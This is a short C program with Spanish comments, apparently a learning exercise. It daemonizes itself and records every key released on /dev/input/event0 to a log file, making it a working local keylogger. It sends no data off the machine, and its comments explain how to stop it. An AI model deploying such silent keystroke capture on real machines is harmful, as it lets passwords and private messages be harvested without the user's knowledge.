#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <fcntl.h>
#include <linux/input.h>

/* para terminar el daemon:
    - pgrep mattdeamon --> pid
    - kill pid
*/

#define LOGFILE "/home/camila/Git/daemon/daemon/daemon.log"

void leerEntrada(int log_fd) {
    struct input_event ev;
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("No se pudo abrir el dispositivo de entrada");
        return;
    }

    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./"; // Para mapear los valores del teclado

    while (1) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) { // Solo se registra cuando se presiona una tecla
            dprintf(log_fd, "%c\n", map[ev.code]);
        }
    }

    close(fd);
}

static void skeleton_daemon()
{
    pid_t pid;

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);
 
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);
   
    if (pid > 0)
        exit(EXIT_SUCCESS);
   
    /* Permisos */
    umask(0);

    /* Directorio */
    chdir("/");
   
    /* Cierra todo los archivos que quedaron abiertos por el padre */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    // Abre el archivo de log en modo de adición.
    // Si el archivo no existe, lo crea.
    int fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);

    if (fd == -1) {
        // Maneja el error...
        exit(EXIT_FAILURE);
    }

    // Redirige stdout y stderr al archivo de log.
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    close(fd);
    // No es necesario cerrar fd aquí, se cerrará cuando el proceso termine.
}

int main()
{
    // Llama a skeleton_daemon para crear el daemon
    skeleton_daemon();
   
    pid_t pid = getpid();
    printf("PID: %d\n",pid);
  
    int log_fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd == -1) {
        perror("No se pudo abrir el archivo de log");
        return EXIT_FAILURE;
    }

    leerEntrada(log_fd);

    close(log_fd);

    return EXIT_SUCCESS;
}
